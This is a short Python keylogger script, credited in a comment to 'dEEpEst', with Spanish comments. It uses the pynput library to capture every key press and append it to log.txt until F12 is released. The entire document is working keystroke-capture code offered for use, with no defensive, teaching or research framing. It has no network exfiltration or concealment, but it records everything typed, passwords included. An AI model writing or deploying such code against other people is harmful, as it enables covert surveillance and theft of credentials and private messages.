#Code modified by dEEpEst 
import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
  # aquí solo llamamos a write_file con la tecla presionada
  write_file(key)

def write_file(key):
  try:
    with open('log.txt', 'a') as f:
      # ya que key no es una lista, no necesitamos iterar
      k = str(key).replace("'", "")
      f.write(k)
      # añadimos un espacio para la legibilidad
      f.write(' ')
  except Exception as e:
    print(f"Error al escribir el archivo: {e}")

def on_release(key):
  if key == Key.f12:
    return False

with Listener(on_press = on_press, on_release = on_release) as listener:
  listener.join()

